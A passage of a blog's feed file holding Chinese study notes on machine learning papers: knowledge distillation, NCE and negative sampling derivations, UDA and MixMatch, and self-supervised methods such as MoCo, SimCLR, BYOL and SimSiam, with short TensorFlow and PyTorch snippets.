href="https://openreview.net/forum?id=ZzwDy_wiWv" target="_blank" rel="noopener">论文</a>，<a href="https://github.com/jingyang2017/KD_SRRL">Git</a></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417172241058.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>方法基本如图所示，就是设计了三种损失相加。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive Knowledge Distillation_pic/image-20210417172649103.png" srcset="/img/loading.gif" lazyload alt style="zoom:90%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive%20Knowledge%20Distillation_pic/image-20210417172728209.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive%20Knowledge%20Distillation_pic/image-20210417172750305.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>works slightly better than the cross-entropy loss.</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive%20Knowledge%20Distillation_pic/image-20210417172939529.png" srcset="/img/loading.gif" lazyload></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/Contrastive%20Knowledge%20Distillation_pic/image-20210417173004988.png" srcset="/img/loading.gif" lazyload></p><p>相对而言，没有设计对比学习，但是论文实验结果还是不错的，相比上一节CRD方法，简单不少，但是效果也不错。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Distillation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> knowledge distillation </tag>
            
            <tag> CRD </tag>
            
            <tag> SRRD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>再看NCE</title>
      <link href="/posts/68340e67.html"/>
      <url>/posts/68340e67.html</url>
      
        <content type="html"><![CDATA[<p>概率语言模型，如最大熵模型和概率神经模型，在参数估计时，都有计算量大的问题，词汇表实在是太大了。这让配分函数的计算量大得就想优化它。</p><p>只看NCE和Negative Sampling（以下简写为NS），就不说其他的方法了。</p><p>NCE和NS刚接触时，看着好像一样一样的。再看，还真是大意了，不够严谨。（废话真多）</p><h2><span id="标准开头">标准开头</span></h2><p>假设以下是一个模型，根据上下文 <span class="math inline">\(c\)</span>预测词表 <span class="math inline">\(V\)</span> 中的词 <span class="math inline">\(w\)</span>。 <span class="math display">\[p_{\theta}(w \mid c)=\frac{u_{\theta}(w, c)}{\sum_{w^{\prime} \in V}u_{\theta}\left(w^{\prime}, c\right)}=\frac{u_{\theta}(w,c)}{Z_{\theta}(c)}\]</span> 假设 <span class="math inline">\(u_\theta = \exp(s_\theta(w,c))\)</span>，<span class="math inline">\(Z_\theta(c)\)</span>自然是配分函数。<span class="math inline">\(s_\theta\)</span> 假设是一个可微的函数。</p><p>如果了解概率图模型，应该见过使用 Importance Sampling + MC的方式近似配分函数的期望的法子。NCE走得就是这条路，只是稍稍改进了些。</p><p>其他定义：</p><p>经验分布表示为 <span class="math inline">\(\hat{p}(w|c)\)</span> 和<span class="math inline">\(\hat{p}(c)\)</span></p><p>模型表示的分布<span class="math inline">\(p_\theta(w|c)\)</span></p><p>NCE的目的就是通过一个 噪声分布 <span class="math inline">\(q(w)\)</span>（w的均匀分布，也可以是对每个概率取幂0&lt; α&lt;1和再normalize得到），得到配分函数的渐进无偏估计。</p><h2><span id="nce">NCE</span></h2><p>方法：通过建立二分类模型，区分来自经验分布（训练数据）和噪声分布的数据，得到最优的模型参数，就是需要的参数求解结果。</p><h3><span id="数据生成">数据生成</span></h3><p>Label d = ｛0，1｝，表示数据属于噪声或者真实数据。分布表示为： <span class="math display">\[p(d, w \mid c)=\left\{\begin{array}{ll}\frac{k}{1+k} \times q(w) &amp; \text { if } d=0 \\\frac{1}{1+k} \times \tilde{p}(w \mid c) &amp; \text { if } d=1\end{array}\right.\]</span> 转换成 d 关于 c 和 w 的条件分布（定义直接推导）： <span class="math display">\[\begin{aligned}p(d=0 \mid c, w) &amp;=\frac{\frac{k}{1+k} \times q(w)}{\frac{1}{1+k}\times \tilde{p}(w \mid c)+\frac{k}{1+k} \times q(w)} \\&amp;=\frac{k \times q(w)}{\tilde{p}(w \mid c)+k \times q(w)} \\p(d=1 \mid c, w) &amp;=\frac{\tilde{p}(w \mid c)}{\tilde{p}(w \mid c)+k\times q(w)}\end{aligned}\]</span> 以上是构建的"proxycorpus"代理的训练数据分布，那么把模型拟合的分布<span class="math inline">\(p_\theta(w|c)\)</span>带入，替换掉经验分布 <span class="math inline">\(\hat{p}(w|c)\)</span>，就可以得到一个可以操作的目标。</p><h3><span id="方法">方法</span></h3><p>但是，<span class="math inline">\(\hat{p}(w|c)\)</span>还是有 <span class="math inline">\(Z_\theta(c)\)</span>啊，这不相当于构造这么多都白干了？</p><p>所以NCE继续改进，将 <span class="math inline">\(Z_\theta(c)\)</span>整体但做一个关于 c 的参数，参数化。然后<a href="https://arxiv.org/abs/1206.6426">一通操作</a>，发现在神经网络模型这种参数巨多的情况下，将<span class="math inline">\(Z_\theta(c)\)</span> 直接设为 1，反而是一种有效且高效的做法，文章里叫做 self-normalized。</p><p>所以，得到的关于 参数 <span class="math inline">\(\theta\)</span>的分布表示为： <span class="math display">\[\begin{aligned}p(d=0 \mid c, w) &amp;=\frac{k \times q(w)}{u_{\theta}(w, c)+k \timesq(w)} \\p(d=1 \mid c, w) &amp;=\frac{u_{\theta}(w, c)}{u_{\theta}(w, c)+k \timesq(w)}\end{aligned}\]</span> 直接操作掉了求和配分项。目标也变成了一个二分类： <span class="math display">\[\mathcal{L}_{\mathrm{NCE}_{k}}=\sum_{(w, c) \in \mathcal{D}}\left(\logp(d=1 \mid c, w)+k \mathbb{E}_{\bar{w} \sim q} \log p(d=0 \mid c,\bar{w})\right)\]</span>只是，其中求期望的部分需要所有单词在噪声分布下求值，得到期望，这显然是低效的。简单的办法，直接MC，期望转Sampling：<span class="math display">\[\begin{aligned}\mathcal{L}_{\mathrm{NCE}_{k}}^{\mathrm{MC}} &amp;=\sum_{(w, c) \in\mathcal{D}}\left(\log p(d=1 \mid c, w)+k \times \sum_{i=1, \bar{w} \simq}^{k} \frac{1}{k} \times \log p(d=0 \mid c, \bar{w})\right) \\&amp;=\sum_{(w, c) \in \mathcal{D}}\left(\log p(d=1 \mid c,w)+\sum_{i=1, \bar{w} \sim q}^{k} \log p(d=0 \mid c, \bar{w})\right)\end{aligned}\]</span> 完</p><p>可以证明（求极值点嘛，再分析一波k趋于无穷的极限），这个目标函数的最优时，就是模型所表示的分布和经验分布匹配的时候。</p><h2><span id="nsnegative-sampling">NS(Negative Sampling)</span></h2><p>word2vec使用过的方法，直接可以写出目标条件分布： <span class="math display">\[\begin{array}{l}p(d=0 \mid c, w)=\frac{1}{u_{\theta}(w, c)+1} \\p(d=1 \mid c, w)=\frac{u_{\theta}(w, c)}{u_{\theta}(w, c)+1}\end{array}\]</span> 可以看成 k = |V| 且 q 为均匀分布的NCE特殊情况。在分析一次像<span class="math inline">\(\mathcal{L}_{\mathrm{NCE}_{k}}\)</span>的损失函数，或者是hingeloss形式的损失函数，求导分析极值，可以发现它最优时，模型所表示的分布和经验分布并不匹配，可以不一致。</p><p>也就是说，NS虽然在word2vec训练时，可以学习到word的representation，但是它并不适用于语言模型等更general的情景。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> ML </category>
          
      </categories>
      
      
        <tags>
            
            <tag> NCE </tag>
            
            <tag> language model </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UDA &amp; MixMatch</title>
      <link href="/posts/d4b0eecc.html"/>
      <url>/posts/d4b0eecc.html</url>
      
        <content type="html"><![CDATA[<h2><span id="uda">UDA</span></h2><p>使用无监督方法，基本架构类似SimCLR等对比学习模型。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325210233919.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>图中M为自定义的模型。</p><p>模型损失，UDA部分：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325210449149.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>加上监督学习部分：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325210534323.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><h3><span id="数据增广">数据增广</span></h3><p>图片数据：AutoAugment (RandAugment)、Cutout</p><p>文本数据：BackTranslation；基于TF-IDF的词替换，保留重要关键词，替换不重要词</p><h3><span id="训练方法">训练方法</span></h3><p>Training Signal Annealing (TSA)，在训练时逐步释放训练信号：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325212243671.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>模型在有标注数据上，先拟合预测概率小于 <span class="math inline">\(\eta_t\)</span> 的数据，逐渐调整 <span class="math inline">\(\eta_t\)</span>，训练先难后易。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325211411280.png" srcset="/img/loading.gif" lazyload></p><p>三种策略设置三种 <span class="math inline">\(\alpha_t\)</span>：</p><ul><li>log：<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325211512054.png" srcset="/img/loading.gif" lazyload></li><li>linear: <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325211532610.png" srcset="/img/loading.gif" lazyload></li><li>exp: <img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325211601426.png" srcset="/img/loading.gif" lazyload></li></ul><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325211630046.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>当模型容易过度拟合时，例如，当问题相对容易或标记数据非常有限时，exp-schedule是最合适的。相反，当模型不太可能过度拟合时(例如，当有丰富的标记数据或当模型使用有效的正则化时)，log-schedule更合适。</p><h3><span id="其他处理">其他处理</span></h3><ol type="1"><li>在使用模型M预测 无标注数据时，使用Confidence-basedmasking，将概率小于 <span class="math inline">\(\beta\)</span>的过滤掉。</li><li>使用sharpening prediction，大的更大，小的更小。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325213456016.png" srcset="/img/loading.gif" lazyload></p><ol start="3" type="1"><li>可以使用entropy minimization：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325213818153.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>​ 上式中还可以使用MixMatch sharpenig：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325213920852.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><ol start="4" type="1"><li>Domain-relevance DataFiltering：对于外部搜集的数据，对于每个类别，都基于对所有示例进行排序属于该类别的概率，并选择概率最高的示例，构成外部数据。</li></ol><p><a href="https://github.com/google-research/uda?utm_source=catalyzex.com">官方实现</a></p><h2><span id="mixmatch">MixMatch</span></h2><p><a href="https://arxiv.org/abs/1905.02249" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/ntozer/mixmatch-tensorflow2.0?utm_source=catalyzex.com">tf2.0</a></p><h3><span id="方法">方法</span></h3><p>另一种混合有标签和无标签数据的方法。整体方法如下：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325222403576.png" srcset="/img/loading.gif" lazyload alt style="zoom:90%;"></p><ol type="1"><li>对于有标签数据，增广batch个，联合其标签 <span class="math inline">\(p_b\)</span> 构成 <span class="math inline">\(\hat{X}\)</span></li><li>对无标签数据，每个样本增广K个，通过LabelGuessing，取模型对K个样本预测的均值，作为这K个样本的伪标签。构成样本集<span class="math inline">\(\hat{U}\)</span>.</li><li>Shuffle样本集，将其进行MixUp，得到MixMatch样本集合</li></ol><p>然后通过下式计算模型损失，模型为自定义模型：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325223614741.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>H就表示普通交叉熵损失，若是分类问题时。p、q就是MixMatch中得到的标签。q来自LabelGuessing。</p><h3><span id="细节">细节</span></h3><p>使用的方法：</p><ol type="1"><li>数据增广：crop, flip等常见方法</li><li>LabelGuessing：<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325223920502.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></li><li>sharpening：<img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325224007819.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></li><li>MixUp：</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325224044015.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><ol start="5" type="1"><li>模型训练时可采用滑动平均、weight decay等方法</li></ol><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-meta">@tf.function</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sharpen</span><span class="hljs-params">(p, T)</span>:</span><br>    <span class="hljs-keyword">return</span> tf.pow(p, <span class="hljs-number">1</span>/T) / tf.reduce_sum(tf.pow(p, <span class="hljs-number">1</span>/T), axis=<span class="hljs-number">1</span>, keepdims=<span class="hljs-literal">True</span>)<br><br><br><span class="hljs-meta">@tf.function</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mixup</span><span class="hljs-params">(x1, x2, y1, y2, beta)</span>:</span><br>    beta = tf.maximum(beta, <span class="hljs-number">1</span>-beta)<br>    x = beta * x1 + (<span class="hljs-number">1</span> - beta) * x2<br>    y = beta * y1 + (<span class="hljs-number">1</span> - beta) * y2<br>    <span class="hljs-keyword">return</span> x, y<br><br>...<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ema</span><span class="hljs-params">(model, ema_model, ema_decay)</span>:</span><br>    <span class="hljs-keyword">for</span> var, ema_var <span class="hljs-keyword">in</span> zip(model.variables, ema_model.variables):<br>        <span class="hljs-keyword">if</span> var.trainable:<br>            ema_var.assign((<span class="hljs-number">1</span> - ema_decay) * var + ema_decay * ema_var)<br>        <span class="hljs-keyword">else</span>:<br>            ema_var.assign(tf.identity(var))<br></code></pre></div></td></tr></table></figure><p>消融实验结果：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325224211436.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>使用论文中提到的所有方法，才能取得最好的结果。其中MixUp操作的影响最大。</p>]]></content>
      
      
      <categories>
          
          <category> Notes </category>
          
          <category> Data Augmentation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> data augmentation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Self-supervised methods note</title>
      <link href="/posts/aa316e6c.html"/>
      <url>/posts/aa316e6c.html</url>
      
        <content type="html"><![CDATA[<h3><span id="jem">JEM</span></h3><p><a href="https://arxiv.org/abs/2002.05709" target="_blank" rel="noopener">paper</a>, <a href="https://github.com/tohmae/pytorch-jem?utm_source=catalyzex.com">link</a></p><p>Google</p><p>建模联合概率，factorize为监督部分和非监督部分。同时论文指出从y开始factorize的话，效果会下降。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132453856.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132509264.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132522763.png" srcset="/img/loading.gif" lazyload></p><p>energy部分使用 Stochastic Gradient Langevin Dynamics（SGLD）对生成数据采样，最小化其energy</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132728516.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132742173.png" srcset="/img/loading.gif" lazyload></p><p>framework：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132852898.png" srcset="/img/loading.gif" lazyload style="zoom:80%;"></p><p>达到效果：提高了 calibration（输出与真实分布具有一致性）, robustness,和out-of-distribution detection方面的性能。</p><p>问题：训练自然会变慢（CIFAR10一个epoch为半个小时），另外就是不稳定，SGLD采样使用随机数据开始。</p><p>JEM采样方式来自 Implicit Generation and Modeling with EBM</p><h3><span id="buffer-sample">Buffer Sample</span></h3><p><a href="https://github.com/rosinality/igebm-pytorch">igebm-pytorch</a>，<a href="https://arxiv.org/abs/1903.08689" target="_blank" rel="noopener">link</a>，Google</p><p>先比于VAE和GAN，是一种根据energy采样的隐式采样，使用一个主网络，可以将生成的限制和目标构建成损失函数。但是生成样本分布需要更多的计算迭代次数。</p><p>energy based采样主要是高维数据采样困难。真实图片分布在highenergy区域，噪声图片分布在low energy区域。</p><p>方法：</p><ol type="1"><li>随机输入开始</li><li>使用模型输出 + SGLD迭代采样出sample i</li><li>将更新过的sample i重新写入buffer</li><li>2、3步迭代 K 次。K不能太小。论文中60，JEM 20</li></ol><p>SGLD：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325132742173.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325135929140.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><h3><span id="supcontrast">SupContrast</span></h3><p><a href="https://arxiv.org/abs/2004.11362" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/HobbitLong/SupContrast">git</a>，Google</p><p>contrastivelearning一般的方式是，先数据增广，然后通过模型识别出来自同一张图的输入，将不是来自同一张图的输入的相似度变小。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325141640924.png" srcset="/img/loading.gif" lazyload></p><p>Supervised ContrastiveLearning将识别对象变为同一类图片，而不是同一张图片。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325141705462.png" srcset="/img/loading.gif" lazyload></p><p>损失函数定义为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325141838354.png" srcset="/img/loading.gif" lazyload></p><p>论文中还有另一种形式的L，但是效果不好。</p><p>通过引入标签数据，计算同一类图片的相似度。在计算损失时，处理同一类图片方法如下</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python">...<br><span class="hljs-comment"># 将相同label的mask出来</span><br>mask = torch.eq(labels, labels.T).float()<br><br><span class="hljs-comment"># tile mask：增广数据shape匹配</span><br>mask = mask.repeat(anchor_count, contrast_count)<br><br><span class="hljs-comment"># mask-out 自己对自己位置进行mask</span><br>logits_mask = torch.scatter(<br>    torch.ones_like(mask),<br>    <span class="hljs-number">1</span>,<br>    torch.arange(batch_size * anchor_count).view(<span class="hljs-number">-1</span>, <span class="hljs-number">1</span>).to(device),<br>    <span class="hljs-number">0</span><br>)<br>mask = mask * logits_mask<br>...<br></code></pre></div></td></tr></table></figure><p>模型训练分为两个阶段。如果只是训练一个encoder，只需要第一阶段。若是要进行分类任务，需要固定encoder训练第二阶段分类器。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325143354895.png" srcset="/img/loading.gif" lazyload></p><p>实验结果：模型对超参数的敏感性降低，使用Supervised ContrastiveLoss能够提升分类准确率（论文中在Imagenet等多个数据集上进行了实验）。</p><h3><span id="hybriddiscriminative-generative">HybridDiscriminative-Generative</span></h3><p><a href="https://arxiv.org/abs/2007.09070" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/lhao499/HDGE?utm_source=catalyzex.com">git</a>,UCB</p><p>通过对比学习contrastivelearning，混合监督与非监督一起训练。和Supervised ContrastiveLearning中的encoder框架不同，没有两个编码的 contrastive 计算。从</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325144230523.png" srcset="/img/loading.gif" lazyload></p><p>变为：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325144104440.png" srcset="/img/loading.gif" lazyload></p><p>只有一个f(x)编码，和 label y。</p><p>这个和 cross entropy 有点像。但是数据来源不同，这里数据是来自K大小的normalization samples，也是来自SGLD方法中设计的buffer。</p><p>这个方法也是针对loss进行变化：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325145037111.png" srcset="/img/loading.gif" lazyload></p><p>计算两个部分的cross entropy loss。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325145319564.png" srcset="/img/loading.gif" lazyload></p><p>论文结果，相比于JEM，在CIFAR10上的效果，有一定提升</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325145506469.png" srcset="/img/loading.gif" lazyload></p><p>提高了 calibration, robustness, 和out-of-distributiondetection方面的性能。</p><p>同时K越大，效果越好。“有钱人的游戏”。</p><h3><span id="momentum-contrast">Momentum Contrast</span></h3><p><a href="https://arxiv.org/abs/1911.05722" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/HobbitLong/PyContrast/tree/master/pycontrast">git</a>，FB</p><p><a href="https://github.com/HobbitLong/PyContrast">PyContrast</a>：pytorchimplementation of a set of (improved) SoTA methods using the sametraining and evaluation pipeline.</p><p>首先contrastive loss 计算的一般框架：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325151256643.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325151340615.png" srcset="/img/loading.gif" lazyload></p><p>就是 k+1个softmax分类器。</p><p>目前的训练方式：</p><ol type="1"><li>end toend：输入一个batch，进行数据增广，然后优化来自同一张图片的相似度。如果有多个类，那么一个batch的数据，覆盖的类是有限的。</li><li>memory bank: 使用一个encoder，构建memorybank（样本的vector表示集合），随机抽取batchsize个数据，与query正例计算loss。然后再更新memorybank中的样本表达数据。如此循环。</li><li>MoCo：使用一个大小为k的queue，出队batch size个数据经过 momentumencoder，与query正例计算loss。然后使用 encoder的参数，以一定 momentum更新 momentum encoder参数。重新入队batch size个样本。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325153918958.png" srcset="/img/loading.gif" lazyload></p><p>momentum更新，论文实验发现，m应该设置为一个很接近1的数，比如0.9999：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325154027809.png" srcset="/img/loading.gif" lazyload></p><p>MoCo伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325153953440.png" srcset="/img/loading.gif" lazyload></p><p>经过MoCo得到一个预训练模型 encoder，使用就类似 BERT 之类的模型。</p><p>接一个简单 Linear classifier 就可以达到接近监督训练模型的效果。</p><h3><span id="simclr">SimCLR</span></h3><p><a href="https://arxiv.org/abs/2002.05709" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/sthalles/SimCLR?utm_source=catalyzex.com">git</a>，Google</p><p>在MoCo之上的改进。两个点：</p><ol type="1"><li>数据增广加一倍，一个图片会有两个 aug(x) 。</li><li>计算NCE时，使用Cosine Similarity，而不是MoCo中的 innerproduct。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325160231546.png" srcset="/img/loading.gif" lazyload></p><p>增广方法使用了：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325160425754.png" srcset="/img/loading.gif" lazyload alt style="zoom:80%;"></p><p>framework：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325160539811.png" srcset="/img/loading.gif" lazyload></p><p>模型结构：</p><p>使用encoder时，如果使用预训练的Resnet之类在ImageNet训练的模型，输出部分重新设计，不需要转到1000类，直接输出模型表征经过avgpool+ fc 之后的结果，即 图中 h。</p><p>h 之后还增加 g(x) DNN层变换。</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325161937370.png" srcset="/img/loading.gif" lazyload></p><p>其他变化：</p><ol type="1"><li>放弃 MoCo的 queue，也不用 memory bank，直接用很大的batchsize....</li><li>使用LARS优化器</li><li>32到128个GPU训练</li></ol><p>论文给出的self-supervised模型+linear classifier在ImageNet上的Top-1accuracy.</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325162122950.png" srcset="/img/loading.gif" lazyload></p><h3><span id="bootstrap-your-own-latent">Bootstrap your own latent</span></h3><p><a href="https://arxiv.org/abs/2006.07733" target="_blank" rel="noopener">paper</a>, <a href="https://github.com/lucidrains/byol-pytorch?utm_source=catalyzex.com">git</a>，Google</p><p>结合SimCLR和MoCo：</p><ol type="1"><li><p>结构还是SimCLR的结构，只是一个分支在这里称为online，一个称为target。</p></li><li><p>使用MoCo的 momentum 更新 momentumencoder参数的方法，更新target网路参数。</p></li><li><p>target部分不计算bp。</p></li><li><p>重新定义损失为mean squared error形式，不需要构造负样本对：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325163343143.png" srcset="/img/loading.gif" lazyload></p></li></ol><p>结构：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325163245658.png" srcset="/img/loading.gif" lazyload></p><p>当然，又是一次提升:</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325163549980.png" srcset="/img/loading.gif" lazyload></p><p>同时，BYOL对batch的敏感性比SimCLR低一些。</p><h3><span id="simple-siamese-simpler-ampbetter">Simple Siamese: simpler &amp;better</span></h3><p><a href="https://arxiv.org/abs/2011.10566" target="_blank" rel="noopener">paper</a>，<a href="https://github.com/PatrickHua/SimSiam?utm_source=catalyzex.com">git</a>，FB</p><p>结合了BOYL和SimCLR，将Siamese结构加入模型，得到一个更neat的设计。</p><ol type="1"><li>删掉BOYL的 momentum encoder。</li><li>不用构造SimCLR中的negative pairs。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325180628135.png" srcset="/img/loading.gif" lazyload></p><p>encoder对两个aug(x)计算hidden representation：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325180841797.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p>计算损失函数：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325181017801.png" srcset="/img/loading.gif" lazyload></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325181033739.png" srcset="/img/loading.gif" lazyload></p><p>伪代码：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325181108866.png" srcset="/img/loading.gif" lazyload></p><p>stopgrad部分视为一个constant输入。</p><p>其他设计：</p><ol type="1"><li>优化器SGD + 0.9 momentum动量 + 0.0001 的 weight decay</li><li>不再需要很大的batch size，batch size 512即可</li></ol><p>消融实验结果：</p><ol type="1"><li>lr不要要decay，效果最好</li><li>batch size最大512即可</li><li>loss设计为 cosine形式更好，在hidden层和predict层之前使用BN效果最好</li><li>Loss的对称计算形式提升了效果。</li></ol><p>SimSiam不再需要negative sample pairs ，large batches ，和momentumencoders。终于找到一个简洁而有效的model。当然，后浪依然会有。</p><h4><span id="why-stop-gradient">Why stop-gradient?</span></h4><p>论文假设只是一个EM模型：</p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/note_pic/image-20210325184008628.png" srcset="/img/loading.gif" lazyload alt style="zoom:67%;"></p><p><img src="https://cdn.jsdelivr.net/gh/racleray/image_storage/images/self-supervised-methods-note_pic/image-20210325184150946.png" srcset="/img/loading.gif" lazyload></p><p>那么问题转化为：</p><p><img 